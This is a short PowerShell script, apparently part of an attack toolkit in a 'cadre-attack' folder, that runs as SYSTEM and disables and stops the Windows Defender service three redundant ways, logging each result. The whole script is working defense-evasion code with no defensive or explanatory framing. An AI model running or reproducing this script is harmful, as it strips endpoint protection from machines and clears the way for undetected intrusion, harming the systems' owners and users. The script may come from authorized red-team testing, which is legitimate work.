# Runs as SYSTEM — kill Defender service for good
$ErrorActionPreference = 'Continue'
$log = 'C:\Tools\cadre-attack\kill-defender-child-out.txt'
"START $(Get-Date -Format o)" | Set-Content $log
try {
  Set-Service WinDefend -StartupType Disabled -Force -ErrorAction SilentlyContinue
  "SET-SERVICE: $LASTEXITCODE" | Add-Content $log
} catch { "SET-SERVICE ERR: $($_.Exception.Message)" | Add-Content $log }
try {
  Stop-Service WinDefend -Force -ErrorAction SilentlyContinue
  "STOP-SERVICE: $LASTEXITCODE" | Add-Content $log
} catch { "STOP-SERVICE ERR: $($_.Exception.Message)" | Add-Content $log }
try {
  & sc.exe config WinDefend start= disabled 2>&1 | Out-File -Append $log
  & sc.exe stop WinDefend 2>&1 | Out-File -Append $log
} catch { "SC ERR: $($_.Exception.Message)" | Add-Content $log }
$svc = Get-Service WinDefend -ErrorAction SilentlyContinue
$sm = ''
if ($svc) { $sm = (Get-CimInstance Win32_Service -Filter "Name='WinDefend'" -ErrorAction SilentlyContinue).StartMode }
"SVC=$($svc.Status)|startmode=$sm" | Add-Content $log
"DONE $(Get-Date -Format o)" | Add-Content $log
